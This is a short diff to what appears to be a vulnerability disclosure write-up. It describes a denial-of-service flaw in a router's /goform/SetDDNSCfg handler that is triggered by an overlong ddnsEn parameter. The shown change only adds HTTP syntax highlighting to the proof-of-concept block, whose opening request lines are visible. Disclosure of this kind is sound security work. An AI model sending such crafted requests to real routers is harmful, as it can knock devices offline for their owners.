@@ -27,8 +27,7 @@ So attacker can construct **a long ddnsEn parameter** in the http request,which 
 Poc of Denial of Service(DoS):
 
 
-
-```
+```http
 POST /goform/SetDDNSCfg HTTP/1.1
 Host: 192.168.2.1
 Connection: close
